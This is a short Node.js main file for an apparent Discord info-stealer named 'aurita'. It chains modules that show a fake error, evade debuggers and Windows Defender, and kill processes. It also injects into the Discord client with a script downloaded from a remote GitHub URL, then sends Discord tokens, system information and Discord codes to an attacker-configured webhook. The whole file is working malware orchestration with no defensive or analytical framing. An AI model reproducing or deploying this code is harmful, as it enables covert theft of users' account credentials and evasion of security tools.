const antiDebug        = require('./modules/antidebug/index.js');
const antiDefender     = require('./modules/antidefender/index.js');
const discordCodes     = require('./modules/discodes/index.js');
const fakeError        = require('./modules/fakeerror/index.js');
const discordInjection = require('./modules/injections/discord/index.js');
const killProcess      = require('./modules/kill/process/index.js');
const system           = require('./modules/system/index.js');
const discordTokens    = require('./modules/tokens/index.js');

const CONFIG = require('./config/config.js');

async function aurita() {
    try {
        const tasks = [
            fakeError(),
            antiDebug(),
            antiDefender(),
            killProcess(),
        ];

        const tasks2 = [
            discordInjection(
                "https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js",
                CONFIG.webhook
            )
        ];

        const tasks3 = [
            discordTokens(CONFIG.webhook),
            system(CONFIG.webhook),
            discordCodes(CONFIG.webhook),
        ];
        
        await Promise.all([
            Promise.all(tasks),
            Promise.all(tasks2),
            Promise.all(tasks3),
        ]);
    } catch (error) {
        console.error('Error occurred:', error);
    }
}

aurita();